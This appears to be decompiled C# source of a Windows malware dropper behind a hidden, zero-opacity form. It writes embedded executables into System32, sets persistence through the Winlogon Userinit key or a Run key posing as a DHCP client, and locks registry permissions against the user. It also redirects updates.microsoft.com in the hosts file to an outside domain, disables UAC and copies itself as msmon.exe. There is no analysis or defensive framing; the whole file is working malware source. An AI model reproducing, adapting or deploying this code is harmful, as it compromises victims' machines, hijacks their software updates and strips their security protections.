using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public sealed class Form1 : Form
{
	private IContainer icontainer_0;

	private string string_0 = Environment.GetEnvironmentVariable("SYSTEMROOT");

	public Form1()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Null");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (method_0("mstap32"))
		{
			Thread.Sleep(2000);
			if (method_0("mstap32"))
			{
				((Form)this).Close();
			}
		}
		if (File.Exists(string_0 + "\\System32\\mstap32.exe"))
		{
			try
			{
				File.SetAttributes(string_0 + "\\System32\\mstap32.exe", FileAttributes.Normal);
				File.Delete(string_0 + "\\System32\\mstap32.exe");
			}
			catch
			{
			}
		}
		method_1();
		method_2();
		method_4();
		method_5();
		method_6();
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, string_0 + "\\System32\\msmon.exe");
		}
		catch
		{
		}
		((Form)this).Close();
	}

	private bool method_0(string string_1)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.Contains(string_1))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private void method_1()
	{
		try
		{
			FileStream output = File.Create(string_0 + "\\System32\\mstap32.exe");
			BinaryWriter binaryWriter = new BinaryWriter(output);
			binaryWriter.Write(Class0.smethod_3());
			binaryWriter.Close();
			method_3(string_0 + "\\System32\\mstap32.exe");
		}
		catch
		{
		}
		try
		{
			FileStream output2 = File.Create(string_0 + "\\System32\\htdns.dll");
			BinaryWriter binaryWriter2 = new BinaryWriter(output2);
			binaryWriter2.Write(Class0.smethod_4());
			binaryWriter2.Close();
			method_3(string_0 + "\\System32\\htdns.dll");
		}
		catch
		{
		}
	}

	private void method_2()
	{
		try
		{
			string identity = Environment.UserDomainName + "\\" + Environment.UserName;
			RegistrySecurity registrySecurity = new RegistrySecurity();
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.WriteKey | RegistryRights.ChangePermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", RegistryKeyPermissionCheck.Default, registrySecurity);
			registryKey.SetValue("Userinit", string_0 + "\\system32\\userinit.exe," + string_0 + "\\System32\\mstap32.exe");
		}
		catch
		{
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey2.SetValue("Userinit", string_0 + "\\system32\\userinit.exe," + string_0 + "\\System32\\mstap32.exe");
			}
			catch
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey3.SetValue("Microsoft(R) DHCP Client", string_0 + "\\System32\\mstap32.exe");
				}
				catch
				{
				}
			}
		}
	}

	private void method_3(string string_1)
	{
		try
		{
			File.SetAttributes(string_1, FileAttributes.ReadOnly | FileAttributes.System);
		}
		catch
		{
		}
	}

	private void method_4()
	{
		try
		{
			string empty = string.Empty;
			IPHostEntry hostEntry = Dns.GetHostEntry("fr328s.info");
			IPAddress[] addressList = hostEntry.AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				empty = iPAddress.ToString();
				StreamWriter streamWriter = new StreamWriter(string_0 + "\\system32\\drivers\\etc\\hosts", append: true);
				streamWriter.WriteLine(empty + " updates.microsoft.com");
				streamWriter.Close();
			}
		}
		catch
		{
		}
	}

	private void method_5()
	{
		try
		{
			Process.Start(string_0 + "\\System32\\mstap32.exe");
		}
		catch
		{
		}
	}

	private void method_6()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch
		{
		}
	}
}
